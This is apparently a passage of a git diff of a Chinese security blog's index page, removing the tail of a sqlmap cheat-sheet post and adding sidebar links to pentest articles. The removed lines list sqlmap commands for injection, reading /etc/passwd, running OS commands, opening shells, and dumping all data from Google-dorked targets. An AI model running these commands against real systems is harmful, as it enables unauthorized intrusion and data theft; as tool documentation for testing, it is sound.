class="string">"http://url/news?id=1"</span>   --cookie <span class="string">"COOKIE_VALUE"</span> <span class="comment">#cookie注入</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   -b <span class="comment">#获取banner信息</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span> --data <span class="string">"id=3"</span>  <span class="comment">#post注入</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>  -v <span class="number">1</span> <span class="operator">-f</span> <span class="comment">#指纹判别数据库类型 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>  --proxy<span class="string">"http://127.0.0.1:8118"</span> <span class="comment">#代理注入</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>--string<span class="string">"STRING_ON_TRUE_PAGE"</span>  <span class="comment">#指定关键词</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --sql-shell <span class="comment">#执行指定sql命令</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --file /etc/passwd </span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --os-cmd=whoami <span class="comment">#执行系统命令</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --os-shell <span class="comment">#系统交互shell</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --os-pwn <span class="comment">#反弹shell </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>   --reg-read <span class="comment">#读取win系统注册表</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --dbs-o <span class="string">"sqlmap.log"</span> <span class="comment">#保存进度 </span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1"</span>    --dbs  -o <span class="string">"sqlmap.log"</span> --resume  <span class="comment">#恢复已保存进度</span></span><br><span class="line">sqlmap -g <span class="string">"google语法"</span> --dump-all --batch  <span class="comment">#google搜索注入点自动 跑出所有字段攻击实例</span></span><br><span class="line">python sqlmap/sqlmap.py -u <span class="string">"http://url/news?id=1&amp;Submit=Submit"</span> --cookie=<span class="string">"PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406"</span> --string=<span class="string">"Surname"</span> --dbms=mysql --users --password</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/25/sqlmap/" data-id="cij1b1e6j0001wsfwq45vu55n" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
   
 </section>
         
@@ -922,7 +1365,7 @@ tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">4</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">4</span></li></ul>
     </div>
   </div>
 
@@ -934,23 +1377,23 @@ tt p://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;
       <ul>
         
           <li>
+            <a href="/2016/04/18/yewuluoji/">渗透项目常见漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2016/04/18/tiquan/">系统提权</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/20/移动应用渗透测试备忘单(二)/">移动应用渗透测试备忘单(二)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/02/移动应用渗透测试备忘单(一)/">移动应用渗透测试备忘单(一)</a>
+          </li>
+        
+          <li>
             <a href="/2016/01/05/solaris/">教你如何配置安全的SOLARIS系统</a>
-          </li>
-        
-          <li>
-            <a href="/2016/01/04/curl/">使用curl进行文件上传</a>
-          </li>
-        
-          <li>
-            <a href="/2016/01/04/cmdtime/">批处理脚本解决0点问题</a>
-          </li>
-        
-          <li>
-            <a href="/2015/12/31/apache/">apache安全加固</a>
-          </li>
-        
-          <li>
-            <a href="/2015/12/25/hello-world/">欢迎来到博客</a>
           </li>
         
       </ul>
